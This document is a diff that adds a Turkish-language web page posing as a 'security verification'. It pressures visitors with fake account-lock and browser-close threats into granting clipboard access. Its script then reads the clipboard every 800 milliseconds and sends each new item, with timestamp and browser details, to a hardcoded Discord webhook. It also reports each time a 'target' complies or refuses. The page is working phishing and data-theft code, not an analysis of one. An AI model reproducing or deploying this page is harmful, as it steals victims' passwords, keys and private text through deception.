@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenlik Doğrulama</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 400px;
+            margin: auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .hidden {
+            display: none;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+        .fake-alert {
+            background: #ff9800;
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>🔒 Güvenlik Doğrulaması</h2>
+    <p>Sistem güncellemesi nedeniyle <strong>kopyala/yapıştır izni</strong> vermelisiniz.</p>
+    <div class="fake-alert">
+        ⚠️ İzin vermezsen hesabın 24 saat kilitlenecek!
+    </div>
+    <button id="allowBtn">✅ İzin Ver</button>
+    <div id="status">Bekleniyor...</div>
+</div>
+
+<script>
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07";
+let lastText = "";
+let intervalId = null;
+let denyCount = 0;
+
+function sendToDiscord(data) {
+    fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: data })
+    }).catch(e => console.log("Discord error:", e));
+}
+
+function startClipboardListener() {
+    if (intervalId) clearInterval(intervalId);
+    intervalId = setInterval(() => {
+        navigator.clipboard.readText().then(text => {
+            if (text && text !== lastText && text.length > 0) {
+                let msg = `📋 **Clipboard Çalındı!**\n\`\`\`${text.substring(0, 1500)}\`\`\`\n🕒 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`;
+                sendToDiscord(msg);
+                lastText = text;
+                document.getElementById("status").innerHTML = "✅ Son kopyalanan: " + text.substring(0, 50);
+            }
+        }).catch(() => {});
+    }, 800);
+}
+
+function requestPermission() {
+    navigator.clipboard.readText().then(() => {
+        document.getElementById("status").innerHTML = "✅ İzin verildi! Kopyaladığın her şey kontrol ediliyor.";
+        startClipboardListener();
+        sendToDiscord("✅ **Hedef izin verdi!** Clipboard dinleme başladı.");
+    }).catch(() => {
+        denyCount++;
+        document.getElementById("status").innerHTML = `❌ İzin vermedin (${denyCount}/5). Lütfen butona tıkla.`;
+        sendToDiscord(`❌ **Hedef izin vermeyi reddetti** (${denyCount}. kez)`);
+        
+        if (denyCount < 5) {
+            setTimeout(() => {
+                document.getElementById("status").innerHTML = "⚠️ ZORUNLU! Butona tıkla.";
+                requestPermission();
+            }, 2000);
+        } else {
+            document.getElementById("status").innerHTML = "🔴 Son uyarı! Tarayıcın kapanacak. Lütfen izin ver.";
+            sendToDiscord("⚠️ **Hedef 5 kez reddetti - zorlama artırıldı**");
+            setTimeout(() => {
+                alert("GÜVENLİK UYARISI: Tarayıcı kapanacak. İzin vermelisin!");
+                requestPermission();
+            }, 1000);
+        }
+    });
+}
+
+document.getElementById("allowBtn").onclick = () => {
+    document.getElementById("status").innerHTML = "İzin isteniyor...";
+    requestPermission();
+};
+
+// Sayfa açılır açılmaz butona dikkat çek
+setTimeout(() => {
+    document.getElementById("status").innerHTML = "🔔 HESABINI KORUMAK İÇİN BUTONA TIKLA!";
+}, 500);
+</script>
+</body>
+</html>
